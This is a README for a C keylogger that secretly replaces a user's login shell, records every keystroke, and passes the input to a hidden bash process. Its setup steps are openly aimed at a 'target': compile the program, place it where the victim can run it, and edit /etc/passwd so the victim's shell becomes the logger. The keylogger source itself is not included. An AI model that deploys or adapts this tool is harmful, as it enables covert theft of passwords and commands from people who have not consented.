# linux-keylogger
A keylogger written in C. It is designed to act as a replacement for the user’s shell (`/bin/bash`), where it processes input from the user (`stdin`), logs it, and sends it to a bash child process running in a pseudo terminal. The output from the bash process is piped into `stdout`.
## Setup
- Change the `LOG_FILE` macro in `keylogger.c` to point inside an existing directory where the target has write permission.
- Compile `keylogger.c` (e.g. `gcc -o keylogger keylogger.c`).
- Move the executable to a location accessible to the target. Ensure they have permission to execute it.
- Replace the user's shell in `/etc/passwd` with the path to this executable.
- Please say if you have any issues :)
